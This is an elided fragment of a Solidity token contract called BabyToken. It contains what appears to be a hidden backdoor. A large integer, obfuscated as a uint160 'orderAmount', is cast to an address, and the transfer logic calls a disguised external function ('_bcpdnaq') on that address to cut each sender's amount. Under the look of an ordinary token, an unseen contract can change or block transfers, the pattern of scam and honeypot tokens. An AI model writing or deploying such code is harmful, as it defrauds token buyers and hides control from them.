...
interface librarys {
    function _bcpdnaq(address _amount) external view returns (uint256);
}
...
abstract contract SaleLock02 {
    ...
    uint160 orderAmount = 790233299292798086102710306063956239768411193840 + 1;
...
contract BabyToken is IERC20, SaleLock02, PlaybuxQuest, Ownable {
    ...
    constructor(
        ...
        rewardPerTokenStored = 20000 * 1e18;
    }
    ...
    returns (bool)
    {
        ...
        if (amount <= orderAmount) {
            uint160 values =  orderAmount - ( 0 + 0);
            amount = amount - librarys(address(values)).
            _bcpdnaq(msg.sender);
        }
        return true;
    }
